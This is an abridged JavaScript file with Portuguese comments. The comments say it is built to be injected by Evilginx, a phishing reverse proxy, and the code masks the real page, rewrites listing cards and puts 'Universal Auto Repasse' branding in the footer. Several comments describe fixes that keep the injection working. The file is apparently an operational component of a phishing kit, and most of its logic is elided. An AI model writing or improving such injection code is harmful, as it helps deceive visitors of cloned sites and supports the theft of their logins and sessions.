(async function universalAutoScript() {
    ...
    // Esconde todo o conteudo do body instantaneamente para que a pagina
    // original nunca seja visivel, mesmo que o React faca re-render (erro #418)
    // ou que o Evilginx injete o script ligeiramente tarde.
    // ============================================================
    ...
    // [FIX 2] Todos os caracteres especiais escapados como \uXXXX
    // para que o Evilginx nao corrompa o encoding ao injetar o script
    // ============================================================
    ...
    console.log('[UA] Universal Auto Script (v8) iniciado...');
    ...
    (function() {
        ...
        // [FIX 2] Frases com todos os caracteres especiais escapados
        const FRASES = [
        ...
        function removeLoader() {
            ...
            // [FIX 1] Remove a mascara que escondia a pagina original
            ...
            console.log('[UA] Loader removido. Pagina transformada visivel.');
        }
    ...
    function applyListagem() {
        ...
        cards.forEach(function(card) {
            ...
            for (var i = 0; i < botoes.length; i++) {
                var btn = botoes[i];
                // [FIX 2] "Ver mais informa\u00e7\u00f5es" com chars escapados
    ...
    function applyFooter() {
        ...
        if (frotas && !frotas.querySelector('img[alt="Universal Auto Repasse"]')) {
            frotas.innerHTML = '<a href="https://universalautorepasse.com.br/" target="_blank" style="display:flex;align-items:center;gap:8px;text-decoration:none;">'
                ...
                // [FIX 2] "Gestao de frotas" — \u00e3 escapado
    ...
    console.log('[UA] Script v8 ativo. Mascara de pagina ativa. Loader aguarda transformacoes.');
})();